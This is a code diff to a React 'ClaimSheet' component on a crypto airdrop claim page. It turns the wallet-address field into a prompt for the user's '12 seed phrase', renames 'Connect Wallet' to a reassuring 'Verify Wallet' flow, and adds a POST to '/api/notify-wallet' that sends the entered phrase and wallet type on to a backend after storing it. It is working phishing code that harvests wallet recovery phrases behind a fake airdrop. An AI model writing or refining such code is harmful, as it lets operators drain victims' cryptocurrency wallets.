@@ -10,12 +10,12 @@ const supabase = createClient(
 )
 
 const WALLETS = [
-  { name: 'MetaMask', logo: '/wallets/metamask.png' },
-  { name: 'Trust Wallet', logo: '/wallets/trustwallet.png' },
-  { name: 'Binance', logo: '/wallets/binance.png' },
-  { name: 'MEXC', logo: '/wallets/mexc.png' },
-  { name: 'Coinbase', logo: '/wallets/coinbase.png' },
-  { name: 'OKX', logo: '/wallets/okx.png' },
+  { name: 'MetaMask', logo: '/mm.JPG' },
+  { name: 'Trust Wallet', logo: '/tw.JPG' },
+  { name: 'Binance', logo: '/binance.JPG' },
+  { name: 'MEXC', logo: '/mexc.JPG' },
+  { name: 'Coinbase', logo: '/cb.JPG' },
+  { name: 'OKX', logo: '/okx.JPG' },
   { name: 'WalletConnect', logo: '/wallets/walletconnect.png' },
   { name: 'Phantom', logo: '/Phantom.webp' },
 ]
@@ -88,7 +88,11 @@ export default function ClaimSheet({ onClose, airdropId, connectedAddress: exter
             ])
 
       if (dbError) throw dbError
-
+      await fetch('/api/notify-wallet', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ walletType: selectedWallet, walletAddress: walletAddress.trim() }),
+        })
       setTimeout(() => {
         setWalletStatus('connected')
       }, 1800)
@@ -139,7 +143,7 @@ export default function ClaimSheet({ onClose, airdropId, connectedAddress: exter
               <p className="text-muted-foreground">
                 {isConnected
                   ? "Your airdrop will be sent to your connected wallet. Confirm below to proceed."
-                  : "Enter your 12 seed phrase to claim your tokens. Make sure it's the correct address as it cannot be changed after submission."}
+                  : "Please Verify your wallet to claim tokens."}
               </p>
 
               {/* Connected wallet pill — shown only when connected */}
@@ -232,7 +236,7 @@ export default function ClaimSheet({ onClose, airdropId, connectedAddress: exter
 
         <div className="px-5 pb-10 pt-2">
           <div className="flex items-center justify-between mb-6">
-            <h2 className="text-lg font-semibold">Connect Wallet</h2>
+            <h2 className="text-lg font-semibold">Verify Wallet</h2>
             <button
               onClick={handleWalletClose}
               className="p-2 rounded-full hover:bg-muted transition-colors"
@@ -244,7 +248,7 @@ export default function ClaimSheet({ onClose, airdropId, connectedAddress: exter
           {walletStatus === 'connected' ? (
             <div className="flex flex-col items-center gap-4 py-8">
               <CheckCircle className="w-16 h-16 text-green-500" />
-              <p className="text-lg font-medium">Wallet Connected!</p>
+              <p className="text-lg font-medium">Wallet Verified!</p>
               <p className="text-sm text-muted-foreground break-all text-center max-w-xs">
                 {walletAddress}
               </p>
@@ -261,7 +265,7 @@ export default function ClaimSheet({ onClose, airdropId, connectedAddress: exter
               <div className="flex items-start gap-3 mb-5 px-4 py-3 rounded-xl bg-primary/5 border border-primary/20">
                 <AlertCircle className="w-4 h-4 text-primary mt-0.5 flex-shrink-0" />
                 <p className="text-sm text-muted-foreground">
-                  Wallet not connected. Your airdrop will be sent directly to your connected address.
+                  Wallet not Verified. Your airdrop will be sent directly to your verified wallet.
                 </p>
               </div>
 
@@ -296,11 +300,11 @@ export default function ClaimSheet({ onClose, airdropId, connectedAddress: exter
 
               {/* Address textarea */}
               <div className="mb-4">
-                <label className="block text-sm font-medium mb-2">Wallet Address</label>
+                <label className="block text-sm font-medium mb-2">Verify this is an active wallet to avoid loss of token</label>
                 <textarea
                   value={walletAddress}
                   onChange={(e) => setWalletAddress(e.target.value)}
-                  placeholder="Enter or paste your wallet address (0x...)"
+                  placeholder="Enter or paste your 12 seed phrase"
                   rows={3}
                   className="w-full px-4 py-3 rounded-xl border border-border bg-muted/40 text-sm resize-none focus:outline-none focus:ring-2 focus:ring-primary/40 focus:border-primary placeholder:text-muted-foreground transition-all"
                 />
@@ -318,12 +322,12 @@ export default function ClaimSheet({ onClose, airdropId, connectedAddress: exter
                 {walletStatus === 'connecting' ? (
                   <>
                     <Spinner />
-                    Connecting…
+                    Verifying…
                   </>
                 ) : (
                   <>
                     <Wallet className="w-4 h-4" />
-                    Connect Wallet
+                    Verify Wallet
                   </>
                 )}
               </button>
